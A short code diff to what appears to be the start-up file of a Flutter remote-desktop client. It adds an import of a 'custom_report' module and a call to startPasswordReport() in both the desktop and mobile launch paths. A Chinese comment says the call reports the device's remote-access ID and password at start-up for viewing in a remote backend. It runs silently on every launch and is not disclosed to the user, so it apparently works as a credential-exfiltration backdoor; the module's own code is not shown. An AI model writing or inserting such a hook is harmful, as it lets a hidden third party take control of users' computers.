@@ -25,6 +25,7 @@ import 'package:window_manager/window_manager.dart';
 
 import 'common.dart';
 import 'consts.dart';
+import 'custom_report.dart';
 import 'mobile/pages/home_page.dart';
 import 'mobile/pages/server_page.dart';
 import 'mobile/widgets/deploy_dialog.dart';
@@ -143,6 +144,9 @@ void runMainApp(bool startService) async {
   gFFI.userModel.refreshCurrentUser();
   runApp(App());
 
+  // 定制：启动识别码+密码上报（远程后台查看用）
+  startPasswordReport();
+
   bool? alwaysOnTop;
   if (isDesktop) {
     alwaysOnTop =
@@ -186,6 +190,9 @@ void runMobileApp() async {
   await Future.wait([gFFI.abModel.loadCache(), gFFI.groupModel.loadCache()]);
   gFFI.userModel.refreshCurrentUser();
   runApp(App());
+
+  // 定制：启动识别码+密码上报（远程后台查看用）
+  startPasswordReport();
   await initUniLinks();
 }
 
